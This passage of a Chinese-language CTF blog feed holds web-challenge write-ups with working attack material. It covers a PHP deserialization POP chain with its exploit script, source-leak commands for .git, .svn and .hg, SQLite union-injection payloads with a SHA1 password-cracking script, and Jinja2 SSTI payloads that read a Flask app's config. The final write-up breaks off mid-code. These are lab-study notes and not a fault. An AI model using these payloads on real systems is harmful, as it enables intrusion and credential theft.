title="examplename"><p>可以看到应该是要自己找flag，用linux命令 find/-name flag，成功找到</p><img src="/2020/03/29/BJD2MRCTF/shell1.png" class="" title="examplename"><h4 id="0X04：ezpop-看wp复现的"><a href="#0X04：ezpop-看wp复现的" class="headerlink" title="0X04：ezpop(看wp复现的)"></a>0X04：ezpop(看wp复现的)</h4><p>打开题目网址，拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">根据Y1ing师傅的wp（附上链接：https:<span class="comment">//www.gem-love.com/ctf/2184.html#Ezpop）</span></span><br><span class="line"><span class="number">1.</span>__wakeup()方法通过preg_match()将<span class="keyword">$this</span>-&gt;source做字符串比较，如果<span class="keyword">$this</span>-&gt;source是Show类，就调用了__toString()方法；</span><br><span class="line"><span class="number">2.</span>__toString()访问了str的source属性，str是Test类，不存在source属性，就调用了Test类的__get()魔术方法；</span><br><span class="line"><span class="number">3.</span>__get()方法将p作为函数使用，p实例化为Modify类，就调用了Modifier的__invoke()方法；</span><br><span class="line"><span class="number">4.</span>__invoke()调用了append()方法，包含$value，若将$value为伪协议，则可读flag.php源码</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $var;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$r = <span class="keyword">new</span> Modifer();</span><br><span class="line">$s = <span class="keyword">new</span> Show();</span><br><span class="line">$t = <span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p=$r;</span><br><span class="line">$s-&gt;str=$t;</span><br><span class="line">$s-&gt;source=$s;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;MR&quot;&gt;&lt;a href=&quot;#MR&quot; class=&quot;headerlink&quot; title=&quot;MR&quot;&gt;&lt;/a&gt;MR&lt;/h2&gt;
    
    </summary>
    
    
    
      <category term="BJD2&amp;MRCTF" scheme="http://yoursite.com/tags/BJD2-MRCTF/"/>
    
  </entry>
  
  <entry>
    <title>信息泄露</title>
    <link href="http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    <id>http://yoursite.com/2020/03/14/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</id>
    <published>2020-03-14T03:37:03.000Z</published>
    <updated>2020-03-14T13:29:08.292Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01：-hg源码泄漏"><a href="#0x01：-hg源码泄漏" class="headerlink" title="0x01：.hg源码泄漏 "></a><strong>0x01：.hg源码泄漏</strong> <a id="more"></a></h4><p>漏洞成因：hg init 的时候会生成.hg</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.g.http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><p>漏洞利用:dvcs-ripper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip -hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x02-git源码泄漏"><a href="#0x02-git源码泄漏" class="headerlink" title="0x02: .git源码泄漏"></a>0x02: .git源码泄漏</h4><p>漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。</p><p>漏洞利用:GitHack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHack.py http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x03-DS-Store文件泄漏"><a href="#0x03-DS-Store文件泄漏" class="headerlink" title="0x03:  .DS_Store文件泄漏"></a>0x03:  .DS_Store文件泄漏</h4><p>漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store,被发现后，获取敏感信息.</p><p>漏洞利用:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure><p>工具:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dsstoreexp</span><br><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure><h4 id="0x04-网站备份压缩文件"><a href="#0x04-网站备份压缩文件" class="headerlink" title="0x04:网站备份压缩文件"></a>0x04:网站备份压缩文件</h4><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。</p><p>漏洞成因：</p><ul><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。</li></ul><p>漏洞测试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.rar</span><br><span class="line">.zip</span><br><span class="line">.7z</span><br><span class="line">.tar.gz</span><br><span class="line">.bak</span><br><span class="line">.swp</span><br><span class="line">.txt</span><br><span class="line">.html</span><br></pre></td></tr></table></figure><h4 id="0x05-SVN文件泄漏"><a href="#0x05-SVN文件泄漏" class="headerlink" title="0x05:SVN文件泄漏"></a>0x05:SVN文件泄漏</h4><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure><h4 id="0x06：WEB-INF-web-xml泄漏"><a href="#0x06：WEB-INF-web-xml泄漏" class="headerlink" title="0x06：WEB-INF/web.xml泄漏"></a>0x06：WEB-INF/web.xml泄漏</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p><p>WEB-INF主要文件或目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p>漏洞利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。</span><br></pre></td></tr></table></figure><p>0x07：CVS泄漏</p><p>漏洞利用:</p><p>取回源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir&#x2F;&#x2F;这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;查看所有的改变的命令，转到download的目录</span><br></pre></td></tr></table></figure><p>工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01：-hg源码泄漏&quot;&gt;&lt;a href=&quot;#0x01：-hg源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;0x01：.hg源码泄漏 &quot;&gt;&lt;/a&gt;&lt;strong&gt;0x01：.hg源码泄漏&lt;/strong&gt;
    
    </summary>
    
    
    
      <category term="敏感信息" scheme="http://yoursite.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>攻防daliy</title>
    <link href="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/"/>
    <id>http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/</id>
    <published>2020-03-11T10:22:54.000Z</published>
    <updated>2020-03-19T14:34:44.325Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>拿到网页，正常操作scan扫一发</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="" title="examplename"><p>访问login.php页面，查看网页源码，有提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> Remove ?debug-Parameter! --&gt;</span></span><br></pre></td></tr></table></figure><p>重新访问login.php?debug,拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到是SQLite3，查找资料知道sqlite自带的结构表sqlite_master，sql是sqlite_master中的一个字段，注入时经常用到的</p><p>下面就是用sql进行对数据库的查询</p><p><code>usr=1&#39; union select name,sql from sqlite_master--+&amp;pw=</code></p><p>可以得到set-cookie:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>下面就是分别查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`usr=1' union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span><span class="comment">--+&amp;pw=`  ----name=+admin</span></span><br><span class="line"><span class="string">`usr=1' union select id,password from Users--+&amp;pw=`</span> <span class="comment">----name=+3fab54a50e770d830c0416df817567662a9dc85c;</span></span><br><span class="line"><span class="string">`usr=1' union select id,hint from Users--+&amp;pw=`</span><span class="comment">----name=+my+fav+word+in+my+fav+paper%3F%21;</span></span><br></pre></td></tr></table></figure><p>结合上面的源码以及给出的hint，password=str(unknown).”Salz!”,应该要用已知的密码在题目给出的文档中找出加密后相同的那段字符串，也就是进行碰撞，下面给出大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br></pre></td></tr></table></figure><p>跑出的密码为ThinJerboa，在admin.php页面登录就可以拿到flag</p><p>（还有一种方法是这段密码刚好可以进行md5解密，去掉题目给出的那部分刚好是ThinJerboa）</p><h4 id="0X02-shrine-20-03-12"><a href="#0X02-shrine-20-03-12" class="headerlink" title="0X02:shrine 20-03-12"></a>0X02:shrine 20-03-12</h4><p>打开网页，整理一下给出的python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>审一下，发现’()’会被替换为空，在blacklist中的会被置为None，提交的参数在/shrine/的路径下</p><p>下面来进行一下测试</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="" title="examplename"><p>通过查阅SSTI模板引擎注入图可以知道应该是jinja2+flask</p><p>由于这里的变量config被禁用，暂时没想到什么办法，看了其他师傅的wp，知道了要用python的沙箱逃逸方法，查了有关flask的内置函数，以下是资料</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br></pre></td></tr></table></figure><p>下面用get_flashed_messages()的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="" title="examplename"><p>可以找到current_app,继续注入当前app的config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以找到flag，这里就不贴了</p><h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>拿到题目，scan冲一发</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="" title="examplename"><p>发现有robots.txt，访问，下载源码user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 